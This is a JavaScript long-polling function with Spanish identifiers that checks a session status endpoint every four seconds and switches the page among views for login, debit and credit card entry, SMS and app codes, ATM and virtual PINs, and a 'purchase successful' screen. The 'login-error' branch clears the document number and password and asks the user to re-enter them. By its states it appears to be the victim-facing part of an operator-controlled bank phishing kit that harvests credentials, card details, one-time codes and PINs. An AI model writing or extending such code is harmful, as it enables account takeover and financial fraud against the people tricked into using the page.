export default async function iniciarLongPolling(
    isMounted,
    uniqId,
    setKey,
    setLoading,
    setSelectVista,
    selectVista,
    setDatosInicio,
    setTituloError
) {
    if (!isMounted.current) return;

    try {
        const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
        });

        const status = selV.data.status;

        const estadosCambioVista = [
        'xlogin', 'tdb', 'xtdb', 'tdc', 'xtdc', 'codsms', 'xcodsms',
        'codapp', 'xcodapp', 'pincaj', 'xpincaj', 'pinvir', 'xpinvir', 
        'exito', 'error'
        ];

        if (estadosCambioVista.includes(status) && status !== selectVista) {
            setSelectVista(status);
            setKey(prev => prev + 1);
            setLoading(false);
            return;
        } else if (status === "fin") {
            setSelectVista("compraExitosa");
            setLoading(false);
            return;
        } else if (status === "error") {
            setSelectVista("errorCompra");
            setLoading(false);
            return;
        } else if (status === "login" || status === "login-error") {
            setDatosInicio({ numeroDocumento: "", contrasenia: "" });
            setSelectVista(status);
            if (status === "login-error")
                setTituloError("Información incorrecta, ingresala nuevamente");
            setKey(prev => prev + 1);
            setLoading(false);
            return;
        }
    } catch (error) {
        console.log(error);
    }

    // Reintentar sólo si sigue montado
    if (isMounted.current) {
        setTimeout(() => {
            iniciarLongPolling(
                isMounted,
                uniqId,
                setKey,
                setLoading,
                setSelectVista,
                selectVista,
                setDatosInicio,
                setTituloError
            );
        }, 4000);
    }else{
        console.log("termino");
        
    }
}
